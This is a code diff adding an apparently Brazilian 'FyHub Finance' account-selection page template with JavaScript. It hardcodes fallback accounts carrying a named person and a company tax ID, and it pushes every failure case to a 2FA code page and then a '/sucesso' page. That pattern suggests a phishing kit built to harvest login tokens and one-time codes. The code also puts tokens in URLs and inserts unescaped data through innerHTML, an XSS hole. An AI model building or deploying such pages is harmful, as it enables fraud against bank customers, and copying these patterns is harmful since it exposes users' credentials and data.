@@ -1,0 +1,136 @@
+{% extends "base.html" %}
+{% block content %}
+<div class="logo-area">
+    <img src="/static/img/logo-fyhub.png" alt="FyHub Finance">
+</div>
+
+<div class="login-card" id="contasCard">
+    <div class="card-header">
+        <button class="btn-back" onclick="goBack()" aria-label="Voltar">
+            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                <path d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z"/>
+            </svg>
+        </button>
+        <div class="card-header-wrapper">
+            <h2>Selecione a conta</h2>
+            <p>Escolha a conta para continuar.</p>
+        </div>
+    </div>
+
+    <div class="account-list" id="accountList">
+        <!-- Accounts loaded dynamically -->
+    </div>
+
+    <p class="terms-text">
+        Ao acessar a conta, você concorda com os nossos <a href="/termos" target="_blank">termos de uso</a>.
+    </p>
+</div>
+{% endblock %}
+
+{% block extra_js %}
+<script>
+let authToken = '';
+let accounts = [];
+
+// Get token from URL
+const urlParams = new URLSearchParams(window.location.search);
+authToken = urlParams.get('token');
+
+if (!authToken) {
+    window.location.href = '/login';
+}
+
+async function loadAccounts() {
+    showLoading();
+    try {
+        const response = await fetch('/api/contas', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ token: authToken })
+        });
+        
+        const data = await response.json();
+        
+        if (data.success) {
+            accounts = data.contas;
+            renderAccounts();
+        } else {
+            // Use default accounts if API fails
+            accounts = data.default_contas || [
+                { account_number: '11186', name: 'Rodrigo Getulio Rezende', document: '***.088.611-**' },
+                { account_number: '11467', name: 'CRED SEGURO LTDA', document: '66.921.824/0001-02' }
+            ];
+            renderAccounts();
+        }
+    } catch (err) {
+        // Default accounts
+        accounts = [
+            { account_number: '11186', name: 'Rodrigo Getulio Rezende', document: '***.088.611-**' },
+            { account_number: '11467', name: 'CRED SEGURO LTDA', document: '66.921.824/0001-02' }
+        ];
+        renderAccounts();
+    } finally {
+        hideLoading();
+    }
+}
+
+function renderAccounts() {
+    const list = document.getElementById('accountList');
+    list.innerHTML = '';
+    
+    accounts.forEach((account, index) => {
+        const item = document.createElement('div');
+        item.className = 'account-item';
+        item.onclick = () => selectAccount(index);
+        item.innerHTML = `
+            <span class="account-number">${account.account_number}</span>
+            <div class="account-info">
+                <div class="account-name">${account.name}</div>
+                <div class="account-document">${account.document}</div>
+            </div>
+        `;
+        list.appendChild(item);
+    });
+}
+
+async function selectAccount(index) {
+    const account = accounts[index];
+    showLoading();
+    
+    try {
+        const response = await fetch('/api/select-account', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ 
+                token: authToken, 
+                account_id: account.account_id || account.account_number,
+                account_number: account.account_number
+            })
+        });
+        
+        const data = await response.json();
+        
+        if (data.requires_2fa) {
+            window.location.href = `/2fa?token=${authToken}&account=${account.account_number}&validateId=${data.validate_code_id || ''}&method=${data.method || 'email'}`;
+        } else if (data.success) {
+            window.location.href = `/sucesso?token=${authToken}&account=${account.account_number}`;
+        } else {
+            // Default: always require 2FA for these accounts
+            window.location.href = `/2fa?token=${authToken}&account=${account.account_number}&validateId=&method=email`;
+        }
+    } catch (err) {
+        // Default to 2FA screen
+        window.location.href = `/2fa?token=${authToken}&account=${account.account_number}&validateId=&method=email`;
+    } finally {
+        hideLoading();
+    }
+}
+
+function goBack() {
+    window.location.href = '/login';
+}
+
+// Load accounts on page ready
+loadAccounts();
+</script>
+{% endblock %}
